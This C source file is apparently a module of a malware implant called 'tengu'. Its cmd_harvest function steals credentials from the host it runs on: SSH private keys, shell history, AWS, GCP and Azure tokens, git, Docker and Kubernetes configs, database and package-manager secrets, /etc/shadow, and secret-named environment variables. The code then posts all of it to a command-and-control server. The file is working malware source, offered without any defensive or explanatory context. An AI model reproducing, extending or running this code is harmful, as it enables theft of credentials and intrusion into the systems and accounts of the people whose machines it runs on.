#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <pwd.h>

#include "tengu.h"

#define H_BUFSZ    131072   // 128 KB total output
#define FILE_MAX    8192    // max bytes per file/key
#define HIST_TAIL   4096    // bytes from end of history files
#define ENV_KEYWORDS_N 10

static const char* ENV_KEYWORDS[ENV_KEYWORDS_N] = {
    "password", "passwd", "secret", "token", "apikey", "api_key",
    "private_key", "credential", "access_key", "auth",
};

static char*  g_buf;
static size_t g_pos;

static void h_str(const char* s) {
    if (!s || !g_buf) return;
    size_t n = strlen(s);
    size_t rem = H_BUFSZ - g_pos - 1;
    if (n > rem) n = rem;
    memcpy(g_buf + g_pos, s, n);
    g_pos += n;
    g_buf[g_pos] = '\0';
}

static void h_section(const char* title) {
    h_str("\n\n[");
    h_str(title);
    h_str("]\n");
}

static void h_found(const char* label) {
    h_str("  >> ");
    h_str(label);
    h_str("\n");
}

// Read up to max_bytes from a file, optionally from the tail.
static void h_file(const char* path, int tail_bytes, int max_bytes) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return; }
    off_t fsize = st.st_size;
    if (fsize == 0) { close(fd); return; }

    size_t rem = H_BUFSZ - g_pos - 1;
    if (rem == 0) { close(fd); return; }

    int want = max_bytes < (int)rem ? max_bytes : (int)rem;

    if (tail_bytes && fsize > want) {
        // seek to (end - want), then skip to next newline
        lseek(fd, (off_t)(fsize - want), SEEK_SET);
        char c;
        while (read(fd, &c, 1) == 1 && c != '\n')
            ;
    }

    ssize_t n = read(fd, g_buf + g_pos, want);
    if (n > 0) {
        g_pos += (size_t)n;
        g_buf[g_pos] = '\0';
        if (g_buf[g_pos - 1] != '\n') {
            if (g_pos < H_BUFSZ - 1) g_buf[g_pos++] = '\n';
        }
    }
    close(fd);
}

// List files matching prefix in a directory, read each.
static void h_ssh_keys(const char* ssh_dir) {
    DIR* d = opendir(ssh_dir);
    if (!d) return;

    struct dirent* e;
    char path[512];
    while ((e = readdir(d)) != NULL) {
        const char* n = e->d_name;
        // private keys: id_* without .pub extension
        if (strncmp(n, "id_", 3) != 0) continue;
        size_t nl = strlen(n);
        if (nl > 4 && strcmp(n + nl - 4, ".pub") == 0) continue;

        snprintf(path, sizeof(path), "%s/%s", ssh_dir, n);
        h_found(path);
        h_file(path, 0, FILE_MAX);
    }
    closedir(d);
}

// Scan /proc/self/environ for interesting variable names.
static void h_env(void) {
    int fd = open("/proc/self/environ", O_RDONLY);
    if (fd < 0) return;

    char env_buf[16384] = {0};
    ssize_t n = read(fd, env_buf, sizeof(env_buf) - 1);
    close(fd);
    if (n <= 0) return;

    // environ entries are NUL-separated KEY=VALUE
    char* p = env_buf;
    char* end = env_buf + n;
    while (p < end) {
        size_t len = strnlen(p, (size_t)(end - p));
        // lowercase search
        char low[512] = {0};
        size_t cl = len < 511 ? len : 511;
        for (size_t i = 0; i < cl; i++)
            low[i] = (p[i] >= 'A' && p[i] <= 'Z') ? p[i] + 32 : p[i];

        for (int k = 0; k < ENV_KEYWORDS_N; k++) {
            if (strstr(low, ENV_KEYWORDS[k])) {
                // print up to 200 chars
                char line[256];
                int ll = (int)len > 200 ? 200 : (int)len;
                snprintf(line, sizeof(line), "  %.*s\n", ll, p);
                h_str(line);
                break;
            }
        }
        p += len + 1;
    }
}

void cmd_harvest(uint32_t req_id) {
    g_buf = calloc(1, H_BUFSZ);
    if (!g_buf) return;
    g_pos = 0;

    const char* home = getenv("HOME");
    if (!home) {
        struct passwd* pw = getpwuid(getuid());
        if (pw) home = pw->pw_dir;
    }
    if (!home) home = "/root";  // fallback

    char path[512];

    // --- SSH ---
    h_section("SSH Private Keys");
    snprintf(path, sizeof(path), "%s/.ssh", home);
    h_ssh_keys(path);

    snprintf(path, sizeof(path), "%s/.ssh/config", home);
    if (access(path, R_OK) == 0) {
        h_found(path);
        h_file(path, 0, FILE_MAX);
    }

    snprintf(path, sizeof(path), "%s/.ssh/known_hosts", home);
    if (access(path, R_OK) == 0) {
        h_found(path);
        h_file(path, 0, 2048);
    }

    // --- Shell history ---
    h_section("Shell History (tail)");
    const char* hist_files[] = {
        ".bash_history", ".zsh_history", ".sh_history", ".fish_history", NULL
    };
    for (int i = 0; hist_files[i]; i++) {
        snprintf(path, sizeof(path), "%s/%s", home, hist_files[i]);
        if (access(path, R_OK) == 0) {
            h_found(path);
            h_file(path, 1, HIST_TAIL);
        }
    }

    // --- Cloud / service credentials ---
    h_section("Cloud & Service Credentials");

    snprintf(path, sizeof(path), "%s/.aws/credentials", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, FILE_MAX); }

    snprintf(path, sizeof(path), "%s/.aws/config", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, 2048); }

    snprintf(path, sizeof(path), "%s/.config/gcloud/application_default_credentials.json", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, FILE_MAX); }

    snprintf(path, sizeof(path), "%s/.config/gcloud/credentials.db", home);
    if (access(path, R_OK) == 0) { h_found(path); h_str("  (binary SQLite - download with: download " ); h_str(path); h_str(")\n"); }

    snprintf(path, sizeof(path), "%s/.azure/accessTokens.json", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, FILE_MAX); }

    // --- Git ---
    h_section("Git Credentials");
    snprintf(path, sizeof(path), "%s/.git-credentials", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, FILE_MAX); }

    snprintf(path, sizeof(path), "%s/.gitconfig", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, 2048); }

    // --- Docker ---
    h_section("Docker");
    snprintf(path, sizeof(path), "%s/.docker/config.json", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, FILE_MAX); }

    // --- Kubernetes ---
    h_section("Kubernetes");
    snprintf(path, sizeof(path), "%s/.kube/config", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, FILE_MAX); }

    // --- Database ---
    h_section("Database Credentials");
    snprintf(path, sizeof(path), "%s/.pgpass", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, 2048); }

    snprintf(path, sizeof(path), "%s/.mysql_history", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 1, 2048); }

    snprintf(path, sizeof(path), "%s/.psql_history", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 1, 2048); }

    // netrc
    snprintf(path, sizeof(path), "%s/.netrc", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, 2048); }

    // --- npm / pip ---
    h_section("Package Manager Tokens");
    snprintf(path, sizeof(path), "%s/.npmrc", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, 2048); }

    snprintf(path, sizeof(path), "%s/.pip/pip.conf", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, 2048); }

    snprintf(path, sizeof(path), "%s/.config/pip/pip.conf", home);
    if (access(path, R_OK) == 0) { h_found(path); h_file(path, 0, 2048); }

    // --- /etc/shadow ---
    h_section("/etc/shadow");
    if (access("/etc/shadow", R_OK) == 0) {
        h_found("/etc/shadow");
        h_file("/etc/shadow", 0, FILE_MAX);
    } else {
        h_str("  (not readable - not root)\n");
    }

    // --- Environment variables ---
    h_section("Interesting Environment Variables");
    h_env();

    // Final stats
    char stats[64];
    snprintf(stats, sizeof(stats), "\n\n[harvest complete - %zu bytes]\n", g_pos);
    h_str(stats);

    if (g_pos == 0) strcpy(g_buf, "(nothing found)");

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, g_buf);
    free(g_buf);
    g_buf = NULL;

    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}
